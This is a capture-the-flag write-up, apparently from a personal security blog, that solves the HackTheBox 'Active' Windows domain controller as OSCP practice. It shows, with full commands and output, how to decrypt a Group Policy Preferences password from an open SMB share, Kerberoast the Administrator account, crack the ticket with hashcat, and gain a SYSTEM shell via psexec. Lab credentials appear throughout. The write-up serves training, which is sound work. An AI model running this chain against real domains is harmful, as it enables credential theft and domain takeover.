---
layout: post
title: HackTheBox Active Writeup - Active Directory - OSCP Practice 
categories: [security, hackthebox, oscp-writeups, friday-gems, active-directory]
tags: [security, hackthebox, oscp]
description: A comprehensive writeup on HackTheBox Active VM which helps learn and practice for OSCP Active Directory Track.
---


### Quick Overview

[Active](https://app.hackthebox.com/machines/Active) is one of the easy Active Directory focused Windows Box from [TJNull OSCP Practice list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#). It's one of those easy machine where you get initial foothold via SMB `Replication` share leak & escalate privileges using Active Directory weakness.

![Active VM - HacktheBox Logo](/assets/media/htb-active-logo.png)

### Enumeration

#### NMapAutomator

Started with enumerating the target with [`NMapAutomator`](https://github.com/21y4d/nmapAutomator) script since it helps in automating all possible ports with vulnerability scripts from `nmap`. Additionally, `NmapAutomator` can help in recon process using `smbmap`, `ffuf`, `nikto`, `DNSRecon`, `SMB` enumeration.

> `sudo nmapAutomator.sh -H $IP --type All`

```bash
Running all scans on X.X.X.X

Host is likely running Windows

---------------------Starting Script Scan-----------------------

PORT      STATE SERVICE       VERSION

53/tcp    open  domain?
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-17 00:30:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-17T00:30:46
|_  start_date: 2023-03-17T00:29:48
|_clock-skew: -1s

---------------------Starting Full Scan------------------------
                                                                                                                

PORT      STATE SERVICE

53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49168/tcp open  unknown
49172/tcp open  unknown
49173/tcp open  unknown

Making a script scan on extra ports: 3268, 3269, 5722, 9389, 49168, 49172, 49173
                                                                                                    

PORT      STATE SERVICE    VERSION
3268/tcp  open  ldap       Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc      Microsoft Windows RPC
9389/tcp  open  mc-nmf     .NET Message Framing
49168/tcp open  msrpc      Microsoft Windows RPC
49172/tcp open  msrpc      Microsoft Windows RPC
49173/tcp open  msrpc      Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Based on `nmap` results, It's clear that we have SMB, Ldap ports are open and warrants a quick verify on those.

#### Suspect 1 - Ldap Search

LdapSearch may sometimes gives really good chunck of information required to connect to Active Directory such as DC, CN and other information. Most likely they don't support guest authentication which is obvious way to exploit. Our LdapSearch results came with few informative results but nothing ground breaking information to enter Active Directory.

```shell
$ ldapsearch -H ldap://X.X.X.X/ -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#
#
dn:
currentTime: 20230317003312.0Z
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=active,DC=htb
namingContexts: DC=active,DC=htb
namingContexts: CN=Configuration,DC=active,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
namingContexts: DC=DomainDnsZones,DC=active,DC=htb
namingContexts: DC=ForestDnsZones,DC=active,DC=htb
defaultNamingContext: DC=active,DC=htb
...
...
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=active,DC=htb
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
isSynchronized: TRUE
isGlobalCatalogReady: TRUE
domainFunctionality: 4
forestFunctionality: 4
domainControllerFunctionality: 4
# search result

search: 2

result: 0 Success
# numResponses: 2
# numEntries: 1
```

#### Suspect 2 - SMB

Moving on to `smbmap` (Port 445), You might be able to collect valuable `Shares` information. The below results got us valuable information such as `Replication` with No Authentication. We may try to enumerate the `Replication` share and further continue our recon process.

```shell
smbmap -H "10.129.47.99"
[+] IP: 10.129.47.99:445        Name: 10.129.47.99                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

smbmap -R "Replication" -H 10.129.47.99 

[+] IP: 10.129.47.99:445        Name: 10.129.47.99                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Replication                                             READ ONLY
        .\Replication\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb

        .\Replication\active.htb\*

        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts

        .\Replication\active.htb\DfsrPrivate\*

        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing

        .\Replication\active.htb\Policies\*

        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}

        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*

        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER

       ... <REDACTED>

        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*

        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT      
```
As you can clearly see that `Replication` directory is open for recon. Upon, further investigating the results looks like the `Group.xml` file contains encrypted password of `SVC_TGS` domain user account. Since It's encryped we could leverage tools like `gpp-decrypt` to decrypt the password.

### Gaining Inital Foothold

```shell
┌──(kali㉿kali)-[~]
└─$ cat Groups.xml                                                     
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

┌──(kali㉿kali)-[~]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
So, Finally we got the `SVC_TGS` domain user accounts password `GPPstillStandingStrong2k18` from `Replication` Shared directory.

#### User Flag (SVC_TGS Account)

Gaining the password for a single Active directory user account is considered to be `Initial Foothold` which might open up tons of possibilities like enumerating the whole active directory. Let's try using the `crackmapexec` tool to validate the password against smb.

```shell
$ crackmapexec smb 10.129.47.99 -u SVC_TGS -p GPPstillStandingStrong2k18 --continue-on-success 
SMB         10.129.47.99    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.47.99    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
```

Upon successful authentication from crackmapexec, you can jump in `SVC_TGS` user account and get the `user.txt` flag from `\Users\SVC_TGS\Desktop` directory.

```shell
$ smbclient //X.X.X.X/Users -U SVC_TGS -W active.htb                                            
Password for [ACTIVE.HTB\SVC_TGS]: GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> cd SVC_TGS
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> dir
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  user.txt                           AR       34  Thu Mar 16 20:30:38 2023
  5217023 blocks of size 4096. 279413 blocks available

smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> 
```

### Privilege Escalation (SVC_TGS -> Administrator)

#### Dumping Active Directory via LDAP

Once we get to know user account & password of Domain User in Active Directory, it might be worth to dump the `Complete Active Directory` configuration and data for further analysis that might give you clue to proceed.

```shell
┌──(kali㉿kali)-[~]
└─$ ldapdomaindump -u active.htb\\SVC_TGS -p 'GPPstillStandingStrong2k18' X.X.X.X -o htb/active/ldap/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
![HTB Active - Active Directory Dump via Ldapdump](/assets/media/htb-active-active-directory-dump.png)

After going through multiple `Users`, `Groups` & `Computer` results, looks like there isn't a way to exploit `Administrator` account. However, `bloodhound` may give you extra insights. I skipped `Bloodhound` or `SharpHound` and started exploring `kereberos port 88`.

#### Kerberoasting

Upon further analysis on `Port 88`, Looks like we could try enumerating to check accounts which are vulnerable to `Kerebroasting` attack. You can learn more about `Kerebroasting` from [this](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/) guide. `GetUserSPNs.py` is the perfect candidate that can accept username and password to capture the kerebros ticket.

```shell
┌──(kali㉿kali)-[~]
└─$ python3 GetUserSPNs.py -request -dc-ip 10.129.47.99  active.htb/svc_tgs
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password: GPPstillStandingStrong2k18

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-03-16 20:30:41.667325             

[-] CCache file is not found. Skipping...

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e7565cc55cb3ff944eea3ae783851733$ec98f6a664caa5af7bc147263d934d33066ec219b8dd7d887ab65cd7a856ae57db4e6f2de93c4627ec766c2797b097fd8772e58bd6edbad5f45c1dd476a6b4b7fa3c31a7e28df2927b618fb3e8d855a86f0b3805ef30d36cc1d5142d2609fb04c3f1596f1629263a5b198c019ee243822fac22ad16b3fc820dcabbb969169675b465fe72bc09358055b2ca96c82363c2f0c31684fc0a37b69c04d3a0ff0fd43da39d12f2e2d171201447c4696045f5bdb001ae4a4cb593d2665e7f901f0912d343a9e455fcdc092a9d4b1883eeecd05c6fd711d47e655aa3bde7bf63c11bec7d27055b1654ad73696f48141ef81c992a6c1a55ce0e977ce1c3bef121187ba2629d0c155013128d9750d47e11b9163b2ab9104363943c40dc3c6e6a5036b32b5fdbb7703fba32ab225a5c4e20cc855315d3d79443f94ebd42174d50234b6ab046a5f4031651ed65b738847de2302c09c7e9a0eb45ab8ab9e3a2c2546dc3419af6a7ae8b9dd7b2d358c3fa9a133dd2a9824398b6c23489c25bdeec863d72f2d724fb3d027a4074760b81a14bcbfe798a21a4986a5e48cd854565f3554d730c71f23f6d68ad34ac04e10042a91887539d8b9d64c87e5a7f04b2818c978e737e4a9a5bb54ca466da927936f079dfd12c90d8470a02449dc4fc67f03b876ff70104ad8a8d2f091cce3ba16520ef4b26d49763955edc00885d5f326f7c6d65a97fb2f62e3228244d841c236bb39993c4ef649722f4518d06b62c7484490fb5612ef8396151b8b7b85af340a3b5677411f48e75d0dd67599bbd915a9699b691221bd070d3c5de9c4587c2ebc67c2075b621ff4e60764c819036438bbfa365aaafc0bf58016db27a1c64b2fe3b33b5a3a613ab80ade796cc943d69e2aed35fac21b3a16a49d20f4aea111084989ac28468a36500909e20bffc155614ca41d085dd3ebe8fd1d29d793421b6929bd163b9c5857837dba835183afcfbe295fb3457d8097d8283e6dd4c4fad28e974b26baae837f67420884a5d3ff3ae619a5378446b3f4a6a64053ac2083fd01624b5e1e20801d85e6725ea303c77d614d1f5c50db5b175ccef0c6ff42bcc23c1fe24103c7a8102a26dfc245cb5cd98e669148265a3a1beb482002cb543bd70116feeadfa5b1038cbf3f26a9990b5cf4cf91e2e27d5d32dfffcc260e38d3666b086479874af0c5061b8149a5b233b2fea98b48c43506d4b2d1d1edf0c65fe4dd5cb94126fb29da3e84bc4dea736d1ca99de5c

```

Upon retrieving the kerebros ticket, You can go ahead and try decrypting the ticket with `rockyou.txt` wordlist. Voila, we got `Ticketmaster1968` as password of `active.htb\Administrator` account.

```shell
$ hashcat -m 13100  svc_tags.hash /usr/share/wordlists/rockyou.txt --force -O

hashcat (v6.2.6) starting
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385


$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e7565cc55cb3ff944eea3ae783851733$ec98f6a664caa5af7bc147263d934d33066ec219b8dd7d887ab65cd7a856ae57db4e6f2de93c4627ec766c2797b097fd8772e58bd6edbad5f45c1dd476a6b4b7fa3c31a7e28df2927b618fb3e8d855a86f0b3805ef30d36cc1d5142d2609fb04c3f1596f1629263a5b198c019ee243822fac22ad16b3fc820dcabbb969169675b465fe72bc09358055b2ca96c82363c2f0c31684fc0a37b69c04d3a0ff0fd43da39d12f2e2d171201447c4696045f5bdb001ae4a4cb593d2665e7f901f0912d343a9e455fcdc092a9d4b1883eeecd05c6fd711d47e655aa3bde7bf63c11bec7d27055b1654ad73696f48141ef81c992a6c1a55ce0e977ce1c3bef121187ba2629d0c155013128d9750d47e11b9163b2ab9104363943c40dc3c6e6a5036b32b5fdbb7703fba32ab225a5c4e20cc855315d3d79443f94ebd42174d50234b6ab046a5f4031651ed65b738847de2302c09c7e9a0eb45ab8ab9e3a2c2546dc3419af6a7ae8b9dd7b2d358c3fa9a133dd2a9824398b6c23489c25bdeec863d72f2d724fb3d027a4074760b81a14bcbfe798a21a4986a5e48cd854565f3554d730c71f23f6d68ad34ac04e10042a91887539d8b9d64c87e5a7f04b2818c978e737e4a9a5bb54ca466da927936f079dfd12c90d8470a02449dc4fc67f03b876ff70104ad8a8d2f091cce3ba16520ef4b26d49763955edc00885d5f326f7c6d65a97fb2f62e3228244d841c236bb39993c4ef649722f4518d06b62c7484490fb5612ef8396151b8b7b85af340a3b5677411f48e75d0dd67599bbd915a9699b691221bd070d3c5de9c4587c2ebc67c2075b621ff4e60764c819036438bbfa365aaafc0bf58016db27a1c64b2fe3b33b5a3a613ab80ade796cc943d69e2aed35fac21b3a16a49d20f4aea111084989ac28468a36500909e20bffc155614ca41d085dd3ebe8fd1d29d793421b6929bd163b9c5857837dba835183afcfbe295fb3457d8097d8283e6dd4c4fad28e974b26baae837f67420884a5d3ff3ae619a5378446b3f4a6a64053ac2083fd01624b5e1e20801d85e6725ea303c77d614d1f5c50db5b175ccef0c6ff42bcc23c1fe24103c7a8102a26dfc245cb5cd98e669148265a3a1beb482002cb543bd70116feeadfa5b1038cbf3f26a9990b5cf4cf91e2e27d5d32dfffcc260e38d3666b086479874af0c5061b8149a5b233b2fea98b48c43506d4b2d1d1edf0c65fe4dd5cb94126fb29da3e84bc4dea736d1ca99de5c:Ticketmaster1968                                                 

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...99de5c
Time.Started.....: Thu Mar 16 21:58:05 2023, (10 secs)
Time.Estimated...: Thu Mar 16 21:58:15 2023, (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1028.4 kH/s (0.92ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539007/14344385 (73.47%)
Rejected.........: 2047/10539007 (0.02%)
Restore.Point....: 10536957/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: TiffanyFWright -> ThelmA55
Hardware.Mon.#1..: Util: 52%
Started: Thu Mar 16 21:58:03 2023
Stopped: Thu Mar 16 21:58:17 2023
```

#### Flag

You could go ahead verify the `Ticketmaster1968` password on `Smbclient` tool and capture our root flag from `\Users\Administrator\Desktop\` directory. 🎉🎉

```shell
smbclient //X.X.X.X/Users -U Administrator -W active.htb                                            
Password for [ACTIVE.HTB\Administrator]: Ticketmaster1968
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
  5217023 blocks of size 4096. 279413 blocks available

smb: \> cd Administrator
smb: \Administrator\> cd Desktop
smb: \Administrator\Desktop\> dir
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                           AR       34  Thu Mar 16 20:30:38 2023
  5217023 blocks of size 4096. 279413 blocks available

smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \Administrator\Desktop\> 
```

### Final Attempt to Shell

If you follow until now, Looks like we haven't actually landed in a Shell/Reverse Shell in `Active` HTB box, It's better to prove our presence in the box rather getting the credentials. `psexec.py` is one of those [useful tool](https://www.sans.org/blog/psexec-python-rocks/) that can spawn a shell if you have valid credentials.

```powershell
┌──(kali㉿kali)-[~]
└─$ python3 ~/.local/bin/psexec.py active.htb/Administrator@10.129.47.99
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password: Ticketmaster1968

[*] Requesting shares on 10.129.47.99.....
[*] Found writable share ADMIN$
[*] Uploading file orkanOnQ.exe
[*] Opening SVCManager on 10.129.47.99.....
[*] Creating service kFXR on 10.129.47.99.....
[*] Starting service kFXR.....
[!] Press help for extra shell commands

Microsoft Windows [Version 6.1.7601]

Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\System32> cd \
C:\> whoami
nt authority\system
C:\> 
```

![HackTheBox - Shivasurya.me](/assets/media/elementary-sherlock.jpg)

### Closing Note:

I hope this post is helpful for folks preparing for Offensive Security Certified Professional certification exam. For bugs,hugs & discussion, DM in [Twitter](https://twitter.com/sshivasurya). Opinions are my own and not the views of my employer.
